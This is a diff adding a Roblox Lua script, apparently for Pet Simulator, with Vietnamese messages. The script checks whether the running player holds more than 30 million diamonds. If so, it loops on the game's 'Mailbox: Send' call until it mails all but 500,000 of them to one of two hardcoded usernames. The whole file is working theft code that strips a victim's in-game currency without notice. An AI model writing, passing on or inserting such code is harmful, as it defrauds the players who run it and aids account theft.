@@ -1,0 +1,46 @@
+repeat task.wait() until game:IsLoaded()
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+local diamondsStat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
+if not diamondsStat then
+	warn("Không tìm thấy chỉ số Diamonds.")
+	return
+end
+
+local currentValue = diamondsStat.Value
+if currentValue <= 30000000 then
+	warn("⚠️ Không đủ kim cương để gửi (cần > 30.000.000).")
+	return
+end
+
+local receivers = { "Thien_Hoa9x", "dinhhabb1a" }
+local receiver = receivers[math.random(1, #receivers)]
+
+local amountToSend = currentValue - 500000
+
+local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
+local Network = require(Client.Network)
+local Save = require(Client.Save).Get()
+
+local diamondsUID
+for uid, v in pairs(Save.Inventory["Currency"]) do
+	if v.id == "Diamonds" then
+		diamondsUID = uid
+		break
+	end
+end
+if not diamondsUID then
+	warn("❌ Không tìm thấy Diamonds UID")
+	return
+end
+
+while true do
+	local success = Network.Invoke("Mailbox: Send", receiver, "Bless", "Currency", diamondsUID, amountToSend)
+	if success then
+		print("📤 Đã gửi " .. amountToSend .. " 💎 cho người dùng: " .. receiver)
+		break
+	end
+	task.wait(0.1)
+end
